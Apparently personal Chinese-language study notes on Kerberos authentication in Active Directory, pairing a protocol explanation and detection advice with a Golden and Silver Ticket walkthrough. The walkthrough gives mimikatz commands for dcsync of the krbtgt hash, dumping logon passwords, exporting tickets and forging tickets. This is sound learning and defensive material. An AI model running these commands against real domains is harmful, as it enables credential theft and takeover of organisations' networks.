
# 背景

- kerberos 协议：ad 域中的主要的身份认证协议，几乎取代了旧的 NTLM 协议。
- 工作流程：通过可信第三方 密钥分发中心（KDC），在 client 和 server 端之间提供双向的身份验证。

## 基本工作流程

kerberos 协议的工作简单场景如下：
![[file-20260611175716569.png]]

- Client: Application Client 应用客户端
- AS: Authentication Server 用来认证用户身份
- TGS: Ticket-Granting Service 用来授权服务访问
- SS: Service Server 用户所请求的服务

整个过程如下：

1. Client 向 KDC 发起 AS_REQ 请求内容为通过 Client 密码 Hash 加密的时间戳、ClientID、网络地址、加密类型等内容
2. KDC 使用 Client hash 进行解密，并在 ntds.dit(只有域控中才有的数据库)中查找该账户，如果结果正确就返回用 krbtgt NTLM-hash 加密的 TGT 票据，TGT 里面包含 PAC（Privilege Attribute Certificate，不同的账号有不同的权限，PAC 就是为了区别不同权限的一种方式），PAC 包含 Client 的 sid，Client 所在的组
3. Client(客户端)凭借 TGT 票据向 KDC 发起针对特定服务的 TGS_REQ 请求
4. KDC 使用 krbtgt NTLM-hash 进行解密，如果结果正确，就返回用服务 NTLM-hash 加密的 TGS 票据，并带上 PAC 返回给 Client(客户端)，这一步不管用户有没有访问服务的权限，只要 TGT（认证票据）正确，就返回 TGS 票据
5. 此时 client 拿着 KDC 给的 TGS 票据去请求服务
6. 服务端使用自己的 NTLM-hash 解密 TGS 票据。如果解密正确，就拿着 PAC 去 KDC 那边问 Client 有没有访问权限，域控解密 PAC。获取 Client 的 sid，以及所在的组，再根据该服务的 ACL，判断 Client 是否有访问服务的权限。

打个比方，整个过程就是：你想坐飞机，但是机场告诉你必须有机票（TGT）才可以登机，接着你去购票处（AS）出示身份证（Client name）购买了一张机票（TGT），你拿着机票登机，在检票处（TGS）出示机票，服务人员告诉了你的座位号（Ticket），然后就可以坐到自己的位置上。


## 安全性假设

kerberos 协议的安全性取决于下面的几个基础条件，这些条件也构成了针对认证协议攻击的突破点：

- The KDC (domain controller) is trusted and secure  
    KDC（域控制器）是可信且安全的。
- Cryptographic keys (derived from passwords) remain confidential  
    加密密钥（由密码生成）始终保密。
- Client systems are not compromised  
    客户系统未受损
- Network time synchronization is maintained (typically ±5 minutes)  
    网络时间同步得以保持（通常为±5 分钟）。
- The network infrastructure cannot be fully trusted (Kerberos encrypts authentication data)  
    网络基础设施不能完全信任（Kerberos 对身份验证数据进行加密）

Mimikatz 利用这些失效场景，通过诸如
- Golden Ticket（当 krbtgt （域控中用来管理发放票据的用户）哈希泄露时伪造 TGT）
- Silver Ticket（当服务帐户哈希泄露时伪造 TGS）
- Pass-The-Ticket（重用被盗票据）
- Kerberoasting（从 TGS 票据破解服务帐户密码）
等技术进行攻击。


## 协议工作方式

Kerberos 是一种专为在非信任网络中运行的受信任主机设计的身份验证协议。它通过集中式身份验证服务器（密钥分发中心 KDC）实现客户端和服务之间的相互身份验证，从而确保：

1. **Clients can verify they're connecting to legitimate services** (server authentication)  
    **客户端可以验证他们连接的是合法服务** （服务器身份验证）。
2. **Services can verify the identity of connecting clients** (client authentication)  
    **服务可以验证连接客户端的身份** （客户端身份验证）
3. **Credentials are not transmitted in plaintext** (encryption)  
    **凭证不会以明文形式传输** （会进行加密）。
4. **Authentication decisions can be made without constant access to the KDC** (ticket caching)  
    **无需持续访问 KDC（票据缓存）即可做出身份验证决策。**

**Key Principle:** We do not authenticate to computers—we authenticate to SERVICES running on computers. Kerberos authenticates us for a specific service, identified by a Service Principal Name (SPN) such as `HTTP/webserver.corp.local` or `CIFS/fileserver.corp.local`.  
**关键原则：** 我们不是对计算机进行身份验证，而是对计算机上运行的服务进行身份验证。Kerberos 对我们访问的特定服务进行身份验证，该服务由服务主体名称 (SPN) 标识，例如 `HTTP/webserver.corp.local` 或 `CIFS/fileserver.corp.local` 。

**Important Limitation:** Kerberos provides no guarantees if the client computers or servers are compromised. An attacker with administrative access to a client can extract tickets from memory, modify authentication processes, or forge tickets if they obtain the necessary cryptographic keys. This is the foundation for most Mimikatz Kerberos attacks.  
**重要限制：** 如果客户端计算机或服务器遭到入侵，Kerberos 无法提供任何保证。拥有客户端管理权限的攻击者可以从内存中提取票据、修改身份验证流程，或者在获取必要的加密密钥后伪造票据。这正是大多数 Mimikatz Kerberos 攻击的基础。

### 协议数据结构

- Kerberos 使用 **ASN.1（抽象语法标记一）** 数据结构，并以 **DER（可区分编码规则）** 进行编码。
- 这种标准化的二进制格式确保了不同 Kerberos 实现之间的互操作性，但也增加了解析的复杂性，从而可能引入安全漏洞。

Common ASN.1 Structures in Kerberos:  
Kerberos 中常见的 ASN.1 结构：

- **KRB-AS-REQ**: Authentication Service Request (request for TGT)  
    **KRB-AS-REQ** ：身份验证服务请求（TGT 请求）
- **KRB-AS-REP**: Authentication Service Reply (TGT delivery)  
    **KRB-AS-REP** ：身份验证服务回复（TGT 交付）
- **KRB-TGS-REQ**: Ticket Granting Service Request (request for service ticket)  
    **KRB-TGS-REQ** ：票据授予服务请求（服务票据请求）
- **KRB-TGS-REP**: Ticket Granting Service Reply (service ticket delivery)  
    **KRB-TGS-REP** ：票据授予服务回复（服务票据交付）
- **KRB-AP-REQ**: Application Request (present service ticket to application server)  
    **KRB-AP-REQ** ：应用程序请求（向应用程序服务器提交服务票据）
- **KRB-AP-REP**: Application Reply (optional mutual authentication response)  
    **KRB-AP-REP** ：应用程序回复（可选的相互认证响应）
- **KRB-ERROR**: Error message with status codes  
    **KRB-ERROR** ：带有状态代码的错误消息

## 总结

### 一、 底层协议与数据结构

Kerberos 消息基于 **ASN.1** 数据结构，使用 **DER** 规则进行二进制编码。核心交互围绕以下三种请求/响应展开：

1. **AS (Authentication Service)**：客户端向 KDC 请求 TGT（票据授予票据）。
2. **TGS (Ticket Granting Service)**：客户端用 TGT 向 KDC 请求特定服务的 TGS（服务票据）。
3. **AP (Application)**：客户端向目标服务出示 TGS 进行身份验证。

**核心原则**：Kerberos 认证的是**服务（SPN，如 `HTTP/web.corp.local`）**，而不是计算机本身。

### 二、 核心认证流程与密钥派生

#### 1. 预认证机制 (Pre-Authentication)

为了防止离线爆破，Kerberos v 5 默认开启预认证。

- **Step 1**：Client 发送无预认证数据的 `AS-REQ`。
- **Step 2**：KDC 拒绝，返回 `KRB5KDC_ERR_PREAUTH_REQUIRED`，并下发**盐值 (Salt)** 和支持的加密类型。
- **Step 3**：Client 使用密码哈希加密当前时间戳（`PA-ENC-TIMESTAMP`），再次发送 `AS-REQ`。
- **Step 4**：KDC 用域内存储的哈希解密时间戳，验证时间偏差（默认 ±5 分钟），通过后下发 TGT。

#### 2. 密钥派生算法 (加密类型 Etype)

这是理解 Kerberos 攻击（如 Kerberoasting、Pass-The-Hash）的底层核心：

- **AES (Etype 17/18，强加密)**：
    - **Salt** = `域名大写 + 用户名` (例: `CORP.LOCALalice`)
    - **Key** = `PBKDF2-HMAC-SHA1(Password, Salt, 4096次迭代, 32字节)`
    - _特点_：有盐值、有迭代次数，抗字典攻击能力强。
- **RC 4-HMAC (Etype 23，遗留弱加密)**：
    - **Key** = `NT Hash = MD4(UTF-16LE(Password))`
    - _特点_：**无盐值、无迭代**。NT Hash 直接作为 RC 4 密钥。这是 Pass-The-Hash 和 Skeleton Key 攻击的根源。

---

### 三、 三大核心攻击面及利用细节

#### 1. TGT 与 Golden Ticket (黄金票据)

- **TGT 结构**：TGT 的 Ticket 部分是用 ** `krbtgt` 账户的哈希**加密的；包含 PAC（特权属性证书，含用户 SID 和组信息）。
- **攻击原理**：如果攻击者通过 DCSync 等手段拿到了 `krbtgt` 的 NT Hash，就可以自己用 AES/RC 4 算法伪造任意用户、任意权限、任意有效期的 TGT。KDC 只要能用 `krbtgt` 哈希解密，就会认为该 TGT 合法。

#### 2. TGS 与 Silver Ticket (白银票据) / Kerberoasting

- **TGS 结构**：当 Client 请求访问 `CIFS/fileserver` 时，KDC 下发的 TGS 是用**目标服务账户（如 fileserver$）的哈希**加密的。
- **Silver Ticket 原理**：如果攻击者拿到了某个服务账户的 Hash，就可以伪造针对该服务的 TGS。**关键点**：目标服务在收到 TGS 后，通常**不会**向 KDC 校验 PAC 的签名（为了性能），而是直接信任 TGS 里的 PAC 数据。因此，伪造的 TGS 会被服务直接放行。
- **Kerberoasting 原理**：攻击者使用普通域账户，向 KDC 请求任意配置了 SPN 的服务账户的 TGS。KDC 会返回用该服务账户 Hash 加密的 TGS。攻击者将其导出，离线爆破出服务账户的明文密码。

#### 3. 委派 (Delegation) 与 TGT 窃取

- **无约束委派 (Unconstrained Delegation)**：当用户访问配置了无约束委派的服务时，KDC 会将用户的 **TGT** 直接放在 TGS 中发给该服务，服务将其缓存在内存（LSASS）中。
- **利用**：如果攻击者拿下了这台服务器，可以直接导出缓存的 TGT。如果域管访问过该服务器，攻击者就能拿到域管的 TGT（Pass-The-Ticket）。
```
mimikatz # sekurlsa::tickets /export
```

#### 4. ASREPRoasting

- **原理**：如果某个账户在 AD 中被勾选了“不使用 Kerberos 预认证”（`DONT_REQUIRE_PREAUTH`），KDC 会直接返回用该用户密码 Hash 加密的 TGT（AS-REP），无需验证时间戳。
- **利用**：直接请求该账户的 AS-REP 并离线爆破。
```
kekeo # tgt::ask /user:vulnerable_user /domain:corp.local /NTLM
```
---

### 四、 防御配置与日志排查 (系统级操作)

#### 1. 核心日志监控 (Event IDs)

在域控上重点监控以下安全日志：

- **Event ID 4768 (TGT 请求)**：关注预认证失败的记录。
- **Event ID 4769 (TGS 请求)**：
    - 监控 `Encryption Type` 字段，如果出现 `0x17` (RC 4)，说明存在加密降级。
    - 监控 `Failure Code`，如果是 `0x1F` (Integrity check failed)，说明 PAC 校验失败，极大概率遭遇了 **Silver Ticket 攻击**。
- **Event ID 4771 (预认证失败)**：用于检测 ASREPRoasting 或针对域账户的密码爆破。

#### 2. 缓解委派攻击

- 将高权限账户（如 Domain Admins）加入 **Protected Users** 安全组。该组用户的 TGT 将被标记为不可转发，从而免疫无约束委派带来的 TGT 窃取。
- 全面排查并消除域内的“无约束委派”配置，改用约束委派或 RBCD。


# 黄金/白银 票据

最老生常谈的问题了

## 黄金

### 背景

黄金票据就是伪造 krbtgt 用户的 TGT 票据，krbtgt 用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户

利用前提：

- 拿到域控(没错就是拿到域控 QAQ),适合做权限维持
- 有 krbtgt 用户的 hash 值(aeshash ntlmhash 等都可以,后面指定一下算法就行了)

条件要求：

- 域名
- 域的 SID 值
- 域的 KRBTGT 账户 NTLM 密码哈希
- 伪造用户名

### 利用过程

1）获取信息

1、获取域名
```javascript
whoami
net time /domain
ipconfig /all
```

2、获取 SID
```javascript
whoami /all
```

3、获取域的 KRBTGT 账户 NTLM 密码哈希或者 aes-256 值，用 mimikatz: 

```javascript
lsadump::dcsync /domain:zz.com /user:krbtgt /csv
```

4、伪造管理员用户名

```javascript
net group "domain admins"
```

2）伪造 TGT

1、清除所有票据

```javascript
klist purge
```

2、使用 mimikatz 伪造指定用户的票据并注入到内存

```javascript
kerberos::golden  
	/admin:administrator  
	/domain:zz.com  
	/sid:S-1-5-21-1373374443-4003574425-2823219550
	/krbtgt:9f3af6256e86408cb31169871fb36e60  
	/ptt
```


## 白银

### 背景

- 黄金票据是伪造 TGT（门票发放票），而白银票据则是伪造 ST（门票），这样的好处是门票不会经过 KDC，从而更加隐蔽。
- 但是伪造的门票只对部分服务起作用,如 cifs（文件共享服务），mssql，winrm（windows 远程管理），DNS 等等

利用前提：

- 拿到目标机器 hash(是目标机,不一定是域控)

条件要求：

- 域名
- 域 sid
- 目标服务器 FQDN
- 可利用的服务
- 服务账号的 NTML HASH
- 需要伪造的用户名

### 利用过程

1）信息收集：

1、获取域名
```javascript
whoami
net time /domain
ipconfig /all
```

2、获取 SID
```javascript
whoami /all
```

3、目标机器的 FQDN
```javascript
net time /domain  
就是hostname+域名 /target:\\WIN-75NA0949GFB.NOONE.com
```

4、可利用的服务 CIFS(磁盘共享的服务)
```javascript
 /service:CIFS  
```

5、要伪造的用户名
```javascript
 /user:Administrator
```

6、服务账号的 ntlm hash(Primary Username : WIN-75 NA 0949 GFB 带的 hash，不是 admin 的)
```javascript
 /rc4:08d93ddf15a6309a46daaa7ec8565296
#生成了mimikatz.log文件(域控主机执行
```

7、利用文件共享服务 cifs，获取服务账号得 NTMLhash 值(在 14068 基础上使用 mimikatz 获取)
注意：服务账号就是域控名$
```javascript
mimikatz.exe privilege::debug sekurlsa::logonpasswords exit >> 2.txt
```

2）伪造 ST

1、清除所有票据
```javascript
klist purge
```

2、使用 mimikatz 伪造指定用户的票据并注入到内存
```javascript
kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:cifs /rc4:服务账号NTMLHASH /user:用户名 /ptt
```

## 总结

- 黄金票据：是直接抓取域控中 ktbtgt 账号的 hash，来在 client 端生成一个 TGT 票据，那么该票据是针对所有机器的所有服务。
- 白银票据：实际就是在抓取到了域控服务 hash 的情况下，在 client 端以一个普通域用户的身份生成 TGS 票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的 target 机器中指定的服务。
